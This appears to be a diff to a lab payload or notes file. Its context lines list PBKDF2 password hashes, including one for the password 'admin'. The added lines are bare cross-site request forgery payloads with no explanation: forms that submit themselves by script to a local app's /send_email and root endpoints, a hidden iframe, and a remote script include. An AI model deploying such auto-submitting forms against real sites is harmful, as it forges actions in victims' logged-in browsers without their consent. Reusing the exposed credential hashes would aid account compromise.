@@ -13,3 +13,24 @@ hash('new_pass') =
 hash('admin') = 'pbkdf2:sha256:150000$C8yeA2EQ$c33e0257c6072ef5b2bffc85f829a66a5f4ec186205d5389f7dc44c1bc23efd2'
 
 
+<form id="badform" method="POST" action="http://localhost:5555/send_email"></form> <script>document.getElementById("badform").submit();</script>
+
+<form id="f" method="post" action="http://localhost:5555/"></form><script>document.getElementById("f").submit();</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<iframe name="fr" id="fr" style="display: none;"></iframe>
+
+<form id="f" method="post" action="http://localhost:5555/" target="_blank"></form><script>document.getElementById("f").submit();</script>
+
+<form id="f" method="post" action="http://localhost:5555/"></form><script src="http://localhost:5555/s.js"></script>
